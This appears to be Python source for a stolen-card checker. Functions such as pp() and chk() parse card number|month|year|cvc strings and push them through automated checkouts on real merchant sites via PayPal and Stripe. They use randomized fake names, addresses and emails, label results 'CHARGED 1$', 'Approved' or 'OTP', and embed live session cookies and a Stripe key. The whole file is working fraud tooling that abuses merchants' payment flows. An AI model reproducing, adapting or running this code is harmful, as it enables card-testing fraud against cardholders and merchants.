	    # 'Cookie': 'ajs_anonymous_id=4b51bc37-2691-44a6-835b-e0fbd0234246; analytics_session_id=1724906900685; analytics_session_id.last_access=1724906917121; __hstc=221905351.6f5844f5d74a2e7ed9442c414d4724e4.1724511184024.1724511184024.1724906901571.2; hubspotutk=6f5844f5d74a2e7ed9442c414d4724e4; intercom-id-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67=d7917f1e-48fc-419e-993e-5e3cdc948a40; intercom-session-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67=MEpyL2xxYm9hQ25xeit0eEUwVXVlVlBNWjJQdnZhOWx1UkZRL1BWYVdRVDNDQzZkYWFBY3M5SmJ4R3RjdjhVOS0tT05RQWNTL1AvVllSQzFZZFJkRUNxZz09--d67cf5726772acbfc672bf5132a506fdfe46eb3e; intercom-device-id-e6aa18a9fbd667eabb26e9bf2bee1abd15f97d67=a4d320a6-9675-4885-ab7c-5696cde5a8cf; _gcl_au=1.1.1139833418.1724511214.167647226.1724906968.1724907622; ajs_user_id=227855; _fbp=fb.1.1724511217759.301623031231626998; _session_id=c48863660ed184f0219e2aaa15068de3; sea_surf=3il71jO28T9EWWouVbzJPyIRQPRIjMbB8c6onC9HTA108SiGlqnjYo17v4CqYUyiV98rQWVbabkvFwGm6GYudQ; __hssrc=1; __hssc=221905351.2.1724906901571; amp_session_id=1724906900685',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'Priority': 'u=4',
	    'Pragma': 'no-cache',
	    'Cache-Control': 'no-cache',
	    # Requests doesn't support trailers
	    # 'TE': 'trailers',
	}
	
	
	data = {
	    "operationName": "setSubscription",
	    "variables": {
	        "billingFrequency": "MONTHLY",
	        "billingInfo": {
	            "address": {
	                "lines": ["safgsdgfnsdewg.dewfr", "hgjg.uk"],
	                "city": "ny",
	                "state": "New York",
	                "country": "us",
	                "postcode": "10022"
	            },
	            "companyAddress": {
	                "lines": ["safgsdgfnsdewg.dewfr", "hgjg.uk"],
	                "city": "ny",
	                "state": "New York",
	                "country": "us",
	                "postcode": "10022"
	            },
	            "email": "safgsdgf@nsdewg.dewfr",
	            "firstName": "nh kuhyj",
	            "lastName": "kjhbkj",
	            "phone": "70223356786"
	        },
	        "planName": "core2024",
	        "paymentMethod": {
	            "appName": "recurly",
	            "token": id
	        }
	    },
	    "query": """mutation setSubscription($planName: ID!, $billingFrequency: PracticeBillingPlanFrequency!, $coupons: [String!], $billingInfo: PracticeBillingBillingInfoInput, $paymentMethod: PracticeBillingPaymentMethodInput) {
	                  practiceBillingSetSubscription(input: {plan: {id: $planName, frequency: $billingFrequency}, couponCodes: $coupons, paymentMethod: $paymentMethod, billingInfo: $billingInfo}) {
	                      practice {
	                          id
	                          billing {
	                              billingInfo { ...billingInfo __typename }
	                              currentSubscription { frequency plan { id name __typename } trial __typename }
	                              paymentChallenge { id token __typename }
	                              paymentMethods { id expiryMonth expiryYear firstSix lastFour __typename }
	                              __typename
	                          }
	                          features { edges { node { id available __typename } __typename } __typename }
	                          __typename
	                      }
	                      __typename
	                  }
	               }
	               fragment billingInfo on PracticeBillingBillingInfo {
	                   address { city country lines postcode state __typename }
	                   companyAddress { city country lines postcode state __typename }
	                   email firstName isCompanyAddressSameAsBilling lastName phone __typename
	               }"""
	}
	
	response = requests.post('https://go.ignitionapp.com/graphql', cookies=cookies, headers=headers, data=json.dumps(data))
	try:
		res=response.json()['errors'][0]['message'].split(' not change subscription: ')[1]
		if 'insufficient funds' in res:
			return 'Charged'
		else:
			return res
	except:
		return response.text
def pp(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	
	if len(mm) == 1:
		mm = f'0{mm}'
	
	if "20" in yy:
		yy = yy.split("20")[1]	
	import requests, re, base64, random, string, user_agent, time
	user = user_agent.generate_user_agent()
	r = requests.session()
	
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	import random
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
					   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
					   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
					   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
					   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
					   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
					   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
					   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
					   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
					   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
					   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
					   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
					   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
					   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
					   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
					   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
					   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
	    
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    return first_name, last_name
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())	
	files = {
	    'wpc_name_your_price': (None, '1.00'),
	    'quantity': (None, '1'),
	    'add-to-cart': (None, '4744'),
	}
	multipart_data = MultipartEncoder(fields=files)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': multipart_data.content_type,
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	response = r.post('https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/cart/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
	
	
	sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
	
	
	nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
	
	
	check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
	
	
	create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))
	
	
	
	
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://switchupcb.com',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-save-checkout-form',
	}
	
	json_data = {
	    'nonce': nonce,
	    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+09%3A31%3A57&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
	}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	
	
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://switchupcb.com',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-create-order',
	}
	
	json_data = {
	    'nonce': create,
	    'payer': None,
	    'bn_code': 'Woo_PPCP',
	    'context': 'checkout',
	    'order_id': '0',
	    'payment_method': 'ppcp-gateway',
	    'funding_source': 'card',
	    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
	    'createaccount': False,
	    'save_payment_method': False,
	}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	id = response.json()['data']['id']
	pcp = response.json()['data']['custom_id']
	
	
	
	import random
	import string
	
	
	lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	
	random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	session_id = f'uid_{lol1}_{lol3}'
	
	
	button_session_id = f'uid_{lol2}_{lol3}'
	
	
	headers = {
	    'authority': 'www.paypal.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	params = {
	    'sessionID': session_id,
	    'buttonSessionID': button_session_id,
	    'locale.x': 'en_US',
	    'commit': 'true',
	    'env': 'production',
	    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWZZZXVDajkyc2JQUFRMMkZ1WXI4Tl91bGZWUkVjT21aTmo4UVdqSEVvUWRTZXJUVWlJdlV3cTNrOEJzSkUtZVFJU0l2WG8zTnZSNU5CRU8mY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMi0wMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxtZXNzYWdlcyZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZnRmdHdjZGxubnpydWtjdWNvZm5mamVneGJxa256In19',
	    'disable-card': '',
	    'token': id,
	}
	
	response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
	
	
	
	
	import requests

	import random
	import string
	
	def generate_random_code():
	    characters = string.ascii_letters + string.digits
	    code = ''.join(random.choices(characters, k=17))
	    return code
	
	random_code = generate_random_code()
	
	
	headers = {
	    'authority': 'www.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://www.paypal.com',
	    'user-agent': user,
	    'x-app-name': 'standardcardfields',
	    'x-country': 'US',
	}
	
	json_data = {
	    'query': '\n		mutation payWithCard(\n		    $token: String!\n		    $card: CardInput!\n		    $phoneNumber: String\n		    $firstName: String\n		    $lastName: String\n		    $shippingAddress: AddressInput\n		    $billingAddress: AddressInput\n		    $email: String\n		    $currencyConversionType: CheckoutCurrencyConversionType\n		    $installmentTerm: Int\n		) {\n		    approveGuestPaymentWithCreditCard(\n				token: $token\n				card: $card\n				phoneNumber: $phoneNumber\n				firstName: $firstName\n				lastName: $lastName\n				email: $email\n				shippingAddress: $shippingAddress\n				billingAddress: $billingAddress\n				currencyConversionType: $currencyConversionType\n				installmentTerm: $installmentTerm\n		    ) {\n				flags {\n				    is3DSecureRequired\n				}\n				cart {\n				    intent\n				    cartId\n				    buyer {\n						userId\n						auth {\n						    accessToken\n						}\n				    }\n				    returnUrl {\n						href\n				    }\n				}\n				paymentContingencies {\n				    threeDomainSecure {\n						status\n						method\n						redirectUrl {\n						    href\n						}\n						parameter\n				    }\n				}\n		    }\n		}\n		',
	    'variables': {
			'token': id,
			'card': {
			    'cardNumber': n,
			    'expirationDate': mm+'/20'+yy,
			    'postalCode': zip_code,
			    'securityCode': cvc,
			},
			'firstName': first_name,
			'lastName': last_name,
			'billingAddress': {
			    'givenName': first_name,
			    'familyName': last_name,
			    'line1': street_address,
			    'line2': None,
			    'city': city,
			    'state': state,
			    'postalCode': zip_code,
			    'country': 'US',
			},
			'email': acc,
			'currencyConversionType': 'PAYPAL',
	    },
	    'operationName': None,
	}
	
	response = requests.post(
	    'https://www.paypal.com/graphql?fetch_credit_form_submit',
	    headers=headers,
	    json=json_data,
	)
	
	
	last = response.text	
	if ('ADD_SHIPPING_ERROR' in last or
	    'NEED_CREDIT_CARD' in last or
	    '"status": "succeeded"' in last or
	    'Thank You For Donation.' in last or
	    'Your payment has already been processed' in last or
	    'Success ' in last or
	    '"type":"one-time"' in last or
	    '/donations/thank_you?donation_number=' in last):
		result = "CHARGED 1$"
	elif 'is3DSecureRequired' in last:
		result = "OTP"
	elif 'INVALID_BILLING_ADDRESS' in last:
		result = "Approved"
	else:
		message = response.json()['errors'][0]['message']
		code = response.json()['errors'][0]['data'][0]['code']
		result = f'{message} ({code})'
	return (result)
def fake_info(ip):
	import requests
	from bs4 import BeautifulSoup
	response = requests.get('https://www.prepostseo.com')
	text=(response.text)
	soup = BeautifulSoup(text, 'html.parser')
	token_meta_tag = soup.find('meta', {'name': '_token'})
	token_value = token_meta_tag['content']
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-csrf-token': token_value,
	    'x-requested-with': 'XMLHttpRequest',
	}
	data = {
	    'lang': 'en_{ip}',
	}
	response = requests.post('https://www.prepostseo.com/ajax/fake-address-generator', cookies=response.cookies, headers=headers, data=data)
	data=(response.json())
	person_info = data[0]
	name = person_info['name']
	email = person_info['email']
	phone = person_info['phone']
	postcode = person_info['postcode']
	street_address = person_info['streetAddress']
	city = person_info['city']
	country = person_info['country']
	state = person_info['state']
	company = person_info['company']
	gender = person_info['gender']
	username = person_info['username']
	password = person_info['passw']
	company_email = person_info['comemail']
	age = person_info['age']
	user = user_agent.generate_user_agent()
	return {
		"Name": name,
		"Email": email,
		"Phone": phone,
		"Postal Code": postcode,
		"Street Address": street_address,
		"City": city,
		"Country": country,
		"State": state,
		"Company": company,
		"Gender": gender,
		"Username": username,
		"Password": password,
		"Company Email": company_email,
		"Age": age,
		"user": user
	}
def chk(cc):
	import re,requests
	card = cc.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	import requests,user_agent
	from bs4 import BeautifulSoup
	import pickle
	import http.cookiejar
	r = requests.session()
	fak=fake_info('US')
	fn=fak['Name'].split(' ')[0]
	ln=fak['Name'].split(' ')[1]
	ad=fak['Street Address']
	email=fak['Email']
	zip=fak['Postal Code']
	city=fak['City']
	Password=fak['Password']
	user=fak['user']
	num=fak['Phone']
	headers = {'user-agent': user}
	def up():
		response = r.get('https://easydigitaldownloads.com/', headers=headers)
		current_time = datetime.now()
		future_time = current_time + timedelta(hours=8)
		la = future_time.strftime('%Y-%m-%d %H:%M')
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			"sv" : {
			 
			  "last_up": la
						}
					}
		existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		with open('sv.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
	
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	try:
		data=json_data['sv']['last_up']
		saved_time = datetime.strptime(data, '%Y-%m-%d %H:%M')
		current_time = datetime.now()
		if current_time >= saved_time:
			up()
		else:
			pass
		with open('sv.pkl', 'rb') as f:
			cookies = pickle.load(f)
		r = requests.session()
		r.cookies = cookies
	except Exception as e:
		print(e)
		up()
	params = {
			    'edd_action': 'add_to_cart',
			    'download_id': '1245715',
			    'discount': '2024JULY55',
			}
	response = r.get('https://easydigitaldownloads.com/checkout/', params=params, cookies=r.cookies, headers=headers)
	response = r.get('https://easydigitaldownloads.com/checkout/',cookies=r.cookies, headers=headers)
	soup = BeautifulSoup(response.text, 'html.parser')
	input_tag = soup.find('input', {'id': 'edd-gateway-stripe'})
	nonce = input_tag['data-stripe-nonce'] if input_tag else None
	params = {
			    'payment-mode': 'stripe',
			}
	data = {
			    'action': 'edd_load_gateway',
			    'edd_payment_mode': 'stripe',
			    'nonce': nonce,
			    'current_page': '160',
			}
	response = r.post(
			    'https://easydigitaldownloads.com/wp-admin/admin-ajax.php',
			    params=params,
			    cookies=r.cookies,
			    headers=headers,
			    data=data,
			)
	soup = BeautifulSoup(response.text, 'html.parser')
	input_tag = soup.find('input', {'id': 'edd-process-stripe-token'})
	token = input_tag['data-token'] if input_tag else None
	tim = input_tag['data-timestamp'] if input_tag else None
	input_tag = soup.find('input', {'id': 'edd-process-checkout-nonce'})
	nonce = input_tag['value'] if input_tag else None
	headers = {
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'priority': 'u=1, i',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
	}
	
	data = f'billing_details[email]={email}&billing_details[phone]={num}&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F97cb06c5c7%3B+stripe-js-v3%2F97cb06c5c7%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Feasydigitaldownloads.com&time_on_page=103268&client_attribution_metadata[client_session_id]=498fbadd-c6ea-49c5-bb16-8b925969d78c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&guid=4dedbe9c-4e29-49bd-b296-7961f6e50715619164&muid=26edc308-eaff-4356-ae1c-d296f1aef3f33edfad&sid=640fce68-0c42-4452-8afc-f43f263c50ee155744&key=pk_live_516JR4KHeKl7xu5z9nKEF3VK0jG4EB5LkIp2eq4rWxoBkXpk8HQEdbY5DuWgmvkIdxY1Lds0gw4PwXk3FCBhyU3BI0026lUnZne&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZXJcj9yKCU-2takekBMz45qWRyAiTpNKAGsLtiOPLBgkbftqiw2lNVs-2gFaDa0zDiKyMHLP0wJkKmt6sX31iX1Bkr0HiZJZj7o5HB78mZs-DMMFGGQz_N-hTbnB6fcSjyZnoOnvPfOG1SZDUSVdVJmiqNyuwk-TRwHWo_gl-WJ4J59am2UwTh06Vjtfu0_Emo7q_Wfa4MpwElAG5EMWU8meURZo0fLZHdDZfeOfIQDL-uykBHLC3LtIPnz4ZGR0ByFI0p5ew-YQKQy5FeHmhPssYE5euA1dc4me1LdAttKAlIHq4wA0yGeQ1iMQqeP_VVmfndfVFXogI48MsyEo1P6MwRUASeYGZGt5Z4iNsNxBtxucdniCOQhgIFPPGmnTW7-L1NKrIjk_HaJScDUJ4Gpn3Oqupq_jWdcXiKBKgRntvHzCSgpU3gDcP0W-sqL7bMNjlz0MuWD6Ydwh7SaI05C8AP_cWE50q65ARYzYY3vCP87-NRzmho8RTsv6k3K_Yy6ppyaUv2jPiLM7ExKjeuDPpN1Z2Jt6--vHOVmlj2xUrMBlCvVt0Ap_y9RhIs_YnSpUAuDMmT8e8fVEEbWn5JvM8P50YSTgbHC6G4wEFEgs3KUTIewjDl4QIbXyvT2VTjlL-Ilx9c7BUtHs75fAoeN0iCLoYX5jInvCwClUkNdX_mtLSPdb_zv6eauJrtsK8jn0l3idwkC82ZUgQNUAMeWR1Cf5BDGeUvlogeDtXBG5pbQ00P7uI0xlmyXskqL32jWgjAudBRRHzxhdsXXOa8V_2COElTZeeQ8DhCJaqrBtvSkOwrExbztFb-LrcztjCGe3qwBezEpdmeAsskFe-ZjiRrp5Z0lkQ-B0LJlsDduan0kY6Z9Lbb8tdIlhGT5pTVyrRfs52N9S6lUwvr5ANAYMC3-J_aVYU0_1j8pHHaStw0QREFwDs_RifWOdSvYhXtMcRLR0CZ3hZ6mJFh9ciujBM1xg3tJiBo_G9UnPaF9K6jrT_xQhmLqQfe34uDQYKBabeAE3XI7f_Sk3UPDSSE8qNozXPFAuWIZ1qbV46L3FPFYq5JdM2kqTFvLrQkvlh5ChHlvdt_nk5N4jCEjHVZlZU8aQJ9Nb_CPIlzwHVdxqV0DrMVf0b0O7c1MNVOwWaXXoCPDX99r6TRwqvAa0qZ4TJ-TKIKOU9NMP5nIr31TvX2xDB0Rnacsj1XNlwT9HmiNDAYMcYVNx9x0e4U8SlKi_dO1Zi7LtlT-fcJyiDMom0ShCcpt0fbgyD95lzw9o5Ie2RUyml5nLAz1SpI__SZSvAzI3ZXgBzgO5U4f3X5NAwgRA78wxrEXVGTpmalC9mLCX3tV7c4KndKzI9mkG0mQhO8VbJpCScgZ6FyFikRg4DNNO-yQgcYn4_nLhzvXuoreqt3u8ci9_Sva3PJp_KQKqoVD70j0S4qJFpzG3tXw2mMP3Z0pejLGW6JmC2x6XxcJW0KbruNTfu00VaUrHFyZ6GEBWabKWl9ghymF_7Xi76x_C2-4MFr-1nBeHTT6Jx_VMxzzjECkzuLUFohHetA0VCge_1HVH3XTPLNyOsRWsEr1gPaeXZb22U9VEg5DLA0xDWQOmO0uoBpb5QPzB_hE6OFekObTPP4yMm35oh9wGYPF6Uak8MNiMhdj0n59rm2QPjm2QLsongE8PwRpji1Vm_2LePV9G8_-SXlciNz_4mA4Bl8wSks6oonMgvPTeBqUpSrGQLRu40_vpYDEkjY5MYIHrjgJHiijsOGbgZOTVixqOpzmrGOml3qHhoDysFscBNzoDqrHHtAY_o8MkLPK-pihRN8RUzZIydAjdwkcbOzBLK4ISWwDEY3SfLikETCiZh-TzMPjb_XOOXSVOjppQxsxU3nIQZTqKDdx-5QNwzb0_m9ISl5oTu_XScTl_3-6-wX9RfJ7GIHS3BYrx7xycRPDbU_uAcPwmfM6EVNtCQ6w0KQYNAZmBL6qtV6Kk9Z581B4BcPtl9NRxMcNqCGCLpmPvi9-r7vf4VayB-KOHSnKRErSGGsasjpXz5cfQJK8myNgMvCDqPBF1cDUBel_3WXadb-4w5YSk1LRavpskHvVZwNgCh4TY_oNwJz234b_LLc9E-Xddi86BwzU4cC7VFM78y0OLAIaVg47mLuD7-nr7MeKFoAo2V4cM5mgiFNqHNoYXJkX2lkzgMxg2-ia3KoMzg2NzUwZWOicGQA.IF3MInMdBCcLwd-xY3tTa6TMk8MSs1Wz-V6Pmf5wCwQ'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	data = {
	    'action': 'edds_process_purchase_form',
	    'form_data': f'edd-discount=&edd_email={email}&phone=&edd_first={fn}&edd_last={ln}&edd_user_login={email}&edd_user_pass={Password}&edd_user_pass_confirm={Password}&edd-purchase-var=needs-to-register&payment-mode=stripe&edd_action=purchase&edd-gateway=stripe&edd-process-checkout-nonce={nonce}',
	    'timestamp': tim,
	    'token': token,
	    'intent_type': '',
	    'intent_id': '',
	    'intent_fingerprint': '',
	    'payment_method[id]': id,
	    'payment_method[object]': 'payment_method',
	    'payment_method[allow_redisplay]': 'unspecified',
	    'payment_method[billing_details][address][city]': '',
	    'payment_method[billing_details][address][country]': '',
	    'payment_method[billing_details][address][line1]': '',
	    'payment_method[billing_details][address][line2]': '',
	    'payment_method[billing_details][address][postal_code]': '',
	    'payment_method[billing_details][address][state]': '',
	    'payment_method[billing_details][email]': 'etfefg@dsfg.lk',
	    'payment_method[billing_details][name]': '',
	    'payment_method[billing_details][phone]': '45345464',
	    'payment_method[card][brand]': 'visa',
	    'payment_method[card][checks][address_line1_check]': '',
	    'payment_method[card][checks][address_postal_code_check]': '',
	    'payment_method[card][checks][cvc_check]': '',
	    'payment_method[card][country]': 'US',
	    'payment_method[card][display_brand]': 'visa',
	    'payment_method[card][exp_month]': mm,
